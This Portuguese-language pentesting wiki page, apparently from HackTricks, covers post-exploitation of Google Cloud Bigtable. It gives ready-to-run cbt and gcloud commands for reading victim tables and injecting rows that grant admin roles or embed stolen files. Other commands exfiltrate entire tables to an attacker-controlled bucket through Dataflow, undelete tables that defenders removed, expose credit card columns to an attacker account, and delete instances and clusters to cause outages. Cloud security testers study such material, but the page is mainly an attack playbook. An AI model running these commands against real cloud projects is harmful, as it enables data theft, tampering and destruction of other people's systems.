# GCP - Bigtable Post Exploitation

{{#include ../../../banners/hacktricks-training.md}}

## Bigtable

For more information about Bigtable check:

{{#ref}}
../gcp-services/gcp-bigtable-enum.md
{{#endref}}

> [!TIP]
> Instale o `cbt` CLI uma vez via o Cloud SDK para que os comandos abaixo funcionem localmente:
>
> <details>
>
> <summary>Instale o cbt CLI</summary>
>
> ```bash
> gcloud components install cbt
> ```
>
> </details>

### Ler linhas

**Permissões:** `bigtable.tables.readRows`

`cbt` vem com o Cloud SDK e se comunica com as APIs de administração/dados sem precisar de middleware. Aponte-o para o projeto/instância comprometida e descarregue as linhas diretamente da tabela. Limite a varredura se você só precisar de uma olhada.

<details>

<summary>Ler entradas do Bigtable</summary>
```bash
# Install cbt
gcloud components update
gcloud components install cbt

# Read entries with creds of gcloud
cbt -project=<victim-proj> -instance=<instance-id> read <table-id>
```
</details>

### Escrever linhas

**Permissões:** `bigtable.tables.mutateRows`, (você precisará de `bigtable.tables.readRows` para confirmar a alteração).

Use a mesma ferramenta para inserir/atualizar (upsert) células arbitrárias. Esta é a maneira mais rápida de backdoor configs, drop web shells, ou plant poisoned dataset rows.

<details>

<summary>Injetar linha maliciosa</summary>
```bash
# Inject a new row
cbt -project=<victim-proj> -instance=<instance-id> set <table> <row-key> <family>:<column>=<value>

cbt -project=<victim-proj> -instance=<instance-id> set <table-id> user#1337 profile:name="Mallory" profile:role="admin" secrets:api_key=@/tmp/stealme.bin

# Verify the injected row
cbt -project=<victim-proj> -instance=<instance-id> read <table-id> rows=user#1337
```
</details>

`cbt set` aceita bytes brutos via a sintaxe `@/path`, assim você pode enviar payloads compilados ou protobufs serializados exatamente como os serviços downstream esperam.

### Exportar linhas para seu bucket

**Permissions:** `dataflow.jobs.create`, `resourcemanager.projects.get`, `iam.serviceAccounts.actAs`

É possível exfiltrar o conteúdo de uma tabela inteira para um bucket controlado pelo atacante iniciando um job do Dataflow que transmite as linhas para um bucket GCS que você controla.

> [!NOTE]
> Observe que você precisará da permissão `iam.serviceAccounts.actAs` sobre algum SA com permissões suficientes para realizar a exportação (por padrão, se não indicado de outra forma, o compute SA padrão será usado).

<details>

<summary>Exportar Bigtable para um bucket GCS</summary>
```bash
gcloud dataflow jobs run <job-name> \
--gcs-location=gs://dataflow-templates-us-<REGION>/<VERSION>/Cloud_Bigtable_to_GCS_Json \
--project=<PROJECT> \
--region=<REGION> \
--parameters=<PROJECT>,bigtableInstanceId=<INSTANCE_ID>,bigtableTableId=<TABLE_ID>,filenamePrefix=<PREFIX>,outputDirectory=gs://<BUCKET>/raw-json/ \
--staging-location=gs://<BUCKET>/staging/

# Example
gcloud dataflow jobs run dump-bigtable3 \
--gcs-location=gs://dataflow-templates-us-central1/latest/Cloud_Bigtable_to_GCS_Json \
--project=gcp-labs-3uis1xlx \
--region=us-central1 \
--parameters=bigtableProjectId=gcp-labs-3uis1xlx,bigtableInstanceId=avesc-20251118172913,bigtableTableId=prod-orders,filenamePrefix=prefx,outputDirectory=gs://deleteme20u9843rhfioue/raw-json/ \
--staging-location=gs://deleteme20u9843rhfioue/staging/
```
</details>

> [!NOTE]
> Altere o template para `Cloud_Bigtable_to_GCS_Parquet` ou `Cloud_Bigtable_to_GCS_SequenceFile` se quiser saídas Parquet/SequenceFile em vez de JSON. As permissões são as mesmas; somente o caminho do template muda.

### Importar linhas

**Permissions:** `dataflow.jobs.create`, `resourcemanager.projects.get`, `iam.serviceAccounts.actAs`

É possível importar o conteúdo de uma tabela inteira de um bucket controlado pelo atacante lançando um job do Dataflow que faz stream de linhas para um bucket GCS que você controla. Para isso o atacante precisará primeiro criar um arquivo parquet com os dados a serem importados no schema esperado. Um atacante pode primeiro exportar os dados em formato parquet seguindo a técnica anterior com a configuração `Cloud_Bigtable_to_GCS_Parquet` e adicionar novas entradas no arquivo parquet baixado



> [!NOTE]
> Observe que você precisará da permissão `iam.serviceAccounts.actAs` sobre alguma SA com permissões suficientes para realizar a exportação (por padrão, se não indicado o contrário, a SA de compute padrão será usada).

<details>

<summary>Importar do bucket GCS para Bigtable</summary>
```bash
gcloud dataflow jobs run import-bt-$(date +%s) \
--region=<REGION> \
--gcs-location=gs://dataflow-templates-<REGION>/<VERSION>>/GCS_Parquet_to_Cloud_Bigtable \
--project=<PROJECT> \
--parameters=bigtableProjectId=<PROJECT>,bigtableInstanceId=<INSTANCE-ID>,bigtableTableId=<TABLE-ID>,inputFilePattern=gs://<BUCKET>/import/bigtable_import.parquet \
--staging-location=gs://<BUCKET>/staging/

# Example
gcloud dataflow jobs run import-bt-$(date +%s) \
--region=us-central1 \
--gcs-location=gs://dataflow-templates-us-central1/latest/GCS_Parquet_to_Cloud_Bigtable \
--project=gcp-labs-3uis1xlx \
--parameters=bigtableProjectId=gcp-labs-3uis1xlx,bigtableInstanceId=avesc-20251118172913,bigtableTableId=prod-orders,inputFilePattern=gs://deleteme20u9843rhfioue/import/parquet_prefx-00000-of-00001.parquet \
--staging-location=gs://deleteme20u9843rhfioue/staging/
```
</details>

### Restaurando backups

**Permissões:** `bigtable.backups.restore`, `bigtable.tables.create`.

Um atacante com essas permissões pode restaurar um backup em uma nova tabela sob seu controle para recuperar dados sensíveis antigos.

<details>

<summary>Restaurar backup do Bigtable</summary>
```bash
gcloud bigtable backups list --instance=<INSTANCE_ID_SOURCE> \
--cluster=<CLUSTER_ID_SOURCE>

gcloud bigtable instances tables restore \
--source=projects/<PROJECT_ID_SOURCE>/instances/<INSTANCE_ID_SOURCE>/clusters/<CLUSTER_ID>/backups/<BACKUP_ID> \
--async \
--destination=<TABLE_ID_NEW> \
--destination-instance=<INSTANCE_ID_DESTINATION> \
--project=<PROJECT_ID_DESTINATION>
```
</details>

### Restaurar tabelas

**Permissions:** `bigtable.tables.undelete`

Bigtable oferece exclusão lógica com um período de carência (normalmente 7 dias por padrão). Durante essa janela, um atacante com a permissão `bigtable.tables.undelete` pode restaurar uma tabela recentemente excluída e recuperar todos os seus dados, potencialmente acessando informações sensíveis que se pensava terem sido destruídas.

Isto é particularmente útil para:
- Recuperar dados de tabelas excluídas por defensores durante resposta a incidentes
- Acessar dados históricos que foram eliminados intencionalmente
- Reverter exclusões acidentais ou maliciosas para manter persistência

<details>

<summary>Restaurar tabela do Bigtable</summary>
```bash
# List recently deleted tables (requires bigtable.tables.list)
gcloud bigtable instances tables list --instance=<instance-id> \
--show-deleted

# Undelete a table within the retention period
gcloud bigtable instances tables undelete <table-id> \
--instance=<instance-id>
```
</details>

> [!NOTE]
> A operação undelete só funciona dentro do período de retenção configurado (padrão 7 dias). Após essa janela expirar, a tabela e seus dados são permanentemente excluídos e não podem ser recuperados por este método.


### Criar Authorized Views

**Permissões:** `bigtable.authorizedViews.create`, `bigtable.tables.readRows`, `bigtable.tables.mutateRows`

Authorized views permitem que você apresente um subconjunto selecionado da tabela. Em vez de respeitar o princípio do menor privilégio, use-os para publicar **exatamente os conjuntos sensíveis de colunas/linhas** que lhe interessam e whitelist seu próprio principal.

> [!WARNING]
> O problema é que, para criar um authorized view você também precisa poder ler e modificar linhas na tabela base; portanto você não está obtendo nenhuma permissão extra, e por isso esta técnica é em grande parte inútil.

<details>

<summary>Criar authorized view</summary>
```bash
cat <<'EOF' > /tmp/credit-cards.json
{
"subsetView": {
"rowPrefixes": ["acct#"],
"familySubsets": {
"pii": {
"qualifiers": ["cc_number", "cc_cvv"]
}
}
}
}
EOF

gcloud bigtable authorized-views create card-dump \
--instance=<instance-id> --table=<table-id> \
--definition-file=/tmp/credit-cards.json

gcloud bigtable authorized-views add-iam-policy-binding card-dump \
--instance=<instance-id> --table=<table-id> \
--member='user:<attacker@example.com>' --role='roles/bigtable.reader'
```
</details>

Como o acesso está restrito à view, os defensores frequentemente deixam de notar que você acabou de criar um novo endpoint de alta sensibilidade.

### Ler Authorized Views

**Permissões:** `bigtable.authorizedViews.readRows`

Se você tiver acesso a um Authorized View, pode ler dados dele usando as bibliotecas cliente do Bigtable, especificando o nome do Authorized View nas suas solicitações de leitura. Observe que o Authorized View provavelmente restringirá o que você pode acessar na tabela. Abaixo há um exemplo usando Python:

<details>

<summary>Ler de Authorized View (Python)</summary>
```python
from google.cloud import bigtable
from google.cloud.bigtable_v2 import BigtableClient as DataClient
from google.cloud.bigtable_v2 import ReadRowsRequest

# Set your project, instance, table, view id
PROJECT_ID = "gcp-labs-3uis1xlx"
INSTANCE_ID = "avesc-20251118172913"
TABLE_ID = "prod-orders"
AUTHORIZED_VIEW_ID = "auth_view"

client = bigtable.Client(project=PROJECT_ID, admin=True)
instance = client.instance(INSTANCE_ID)
table = instance.table(TABLE_ID)

data_client = DataClient()
authorized_view_name = f"projects/{PROJECT_ID}/instances/{INSTANCE_ID}/tables/{TABLE_ID}/authorizedViews/{AUTHORIZED_VIEW_ID}"

request = ReadRowsRequest(
authorized_view_name=authorized_view_name
)

rows = data_client.read_rows(request=request)
for response in rows:
for chunk in response.chunks:
if chunk.row_key:
row_key = chunk.row_key.decode('utf-8') if isinstance(chunk.row_key, bytes) else chunk.row_key
print(f"Row: {row_key}")
if chunk.family_name:
family = chunk.family_name.value if hasattr(chunk.family_name, 'value') else chunk.family_name
qualifier = chunk.qualifier.value.decode('utf-8') if hasattr(chunk.qualifier, 'value') else chunk.qualifier.decode('utf-8')
value = chunk.value.decode('utf-8') if isinstance(chunk.value, bytes) else str(chunk.value)
print(f"  {family}:{qualifier} = {value}")
```
</details>

### Negação de Serviço via operações de exclusão

**Permissões:** `bigtable.appProfiles.delete`, `bigtable.authorizedViews.delete`, `bigtable.authorizedViews.deleteTagBinding`, `bigtable.backups.delete`, `bigtable.clusters.delete`, `bigtable.instances.delete`, `bigtable.tables.delete`

Qualquer uma das permissões de exclusão do Bigtable pode ser explorada para ataques de negação de serviço. Um atacante com essas permissões pode interromper operações excluindo recursos críticos do Bigtable:

- **`bigtable.appProfiles.delete`**: Excluir perfis de aplicativo, rompendo conexões de clientes e configurações de roteamento
- **`bigtable.authorizedViews.delete`**: Remover visualizações autorizadas, bloqueando caminhos legítimos de acesso para aplicações
- **`bigtable.authorizedViews.deleteTagBinding`**: Remover associações de tags de visualizações autorizadas
- **`bigtable.backups.delete`**: Destruir instantâneos de backup, eliminando opções de recuperação de desastres
- **`bigtable.clusters.delete`**: Excluir clusters inteiros, causando indisponibilidade imediata dos dados
- **`bigtable.instances.delete`**: Remover instâncias completas do Bigtable, apagando todas as tabelas e configurações
- **`bigtable.tables.delete`**: Excluir tabelas individuais, causando perda de dados e falhas nas aplicações

<details>

<summary>Excluir recursos do Bigtable</summary>
```bash
# Delete a table
gcloud bigtable instances tables delete <table-id> \
--instance=<instance-id>

# Delete an authorized view
gcloud bigtable authorized-views delete <view-id> \
--instance=<instance-id> --table=<table-id>

# Delete a backup
gcloud bigtable backups delete <backup-id> \
--instance=<instance-id> --cluster=<cluster-id>

# Delete an app profile
gcloud bigtable app-profiles delete <profile-id> \
--instance=<instance-id>

# Delete a cluster
gcloud bigtable clusters delete <cluster-id> \
--instance=<instance-id>

# Delete an entire instance
gcloud bigtable instances delete <instance-id>
```
</details>

> [!WARNING]
> Operações de exclusão costumam ser imediatas e irreversíveis. Certifique-se de que existam backups antes de testar esses comandos, pois eles podem causar perda permanente de dados e grave interrupção do serviço.

{{#include ../../../banners/hacktricks-training.md}}
